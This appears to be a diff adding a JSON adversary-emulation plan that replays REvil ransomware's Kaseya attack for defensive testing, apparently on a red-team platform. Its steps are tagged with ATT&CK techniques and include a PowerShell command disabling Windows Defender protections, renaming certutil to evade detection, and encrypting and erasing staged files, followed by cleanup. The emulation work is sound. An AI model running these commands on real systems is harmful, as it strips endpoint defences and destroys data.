@@ -1,0 +1,195 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "REvil ransomware targeting Kaseya based on CTI from https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/",
+        "display_name": "REvil-Kaseya",
+        "name": "REvil-Kaseya",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "SLEEP"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ping 127.0.0.1 -n 20",
+                "rtags": [
+                    "att&ck-technique:T1497.003"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DEFENSE EVASION"
+            },
+            "5": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "6": {
+                "function": "ifelse",
+                "next": "10",
+                "step": "5",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend",
+                "rtags": [
+                    "att&ck-technique:T1562.001"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c copy /Y \"%SYSTEMROOT%\\System32\\certutil.exe\" \"%SYSTEMROOT%\\cert.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1036.003"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netsh advfirewall firewall set rule group=\"Network Discovery\" new enable=Yes",
+                "rtags": [
+                    "att&ck-technique:T1562.004"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "IMPACT"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell mkdir \"%USERPROFILE%\\Desktop\\REvil\"",
+                "rtags": [
+                    "att&ck-technique:T1074"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\REvil\\target_file.xls\" --size 1MB --count 1000 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\REvil\\\" --encrypt --password \"#RansomwareSucks\" --erase",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/REvil/readme.txt\" --dest \"%USERPROFILE%\\Desktop\\readme.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1491.001"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S %USERPROFILE%\\Desktop\\REvil\"",
+                "rtags": [],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "21": {
+                "function": "ifelse",
+                "next": "25",
+                "step": "20",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del \"%SYSTEMROOT%\\cert.exe\"",
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netsh advfirewall firewall set rule group=\"Network Discovery\" new enable=No",
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell Set-MpPreference -DisableRealtimeMonitoring $false -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Advanced -SubmitSamplesConsent SendAllSamples",
+                "type": "message"
+            },
+            "25": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
